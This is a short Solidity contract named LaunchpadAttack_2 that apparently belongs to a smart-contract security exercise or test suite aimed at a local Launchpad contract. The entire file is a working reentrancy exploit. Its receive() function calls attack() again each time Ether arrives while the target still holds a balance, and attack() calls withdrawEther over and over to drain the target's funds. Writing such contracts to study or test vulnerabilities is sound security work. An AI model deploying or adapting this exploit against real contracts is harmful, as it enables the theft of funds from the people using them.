// SPDX-License-Identifier: MIT

pragma solidity ^0.8.15;

import "../custom/Launchpad.sol";
import "../common/ERC20.sol";

contract LaunchpadAttack_2 {
    Launchpad private _contract;
    ERC20 private credits;

    constructor(address _address, address creditsAddress) {
        _contract = Launchpad(_address);
        credits = ERC20(creditsAddress);
    }

    // Receive is called when the contract sends Ether to the attacker contract.
    receive() external payable {
        if (address(_contract).balance >= 1 wei) {
            attack();
        }
    }

    function approve(uint256 amount) external {
        credits.approve(address(_contract), amount);
    }

    function depositToken(uint256 amount) external {
        _contract.depositToken(amount);
    }

    function attack() public {
        _contract.withdrawEther(_contract.getCreditsPrice());
    }
}
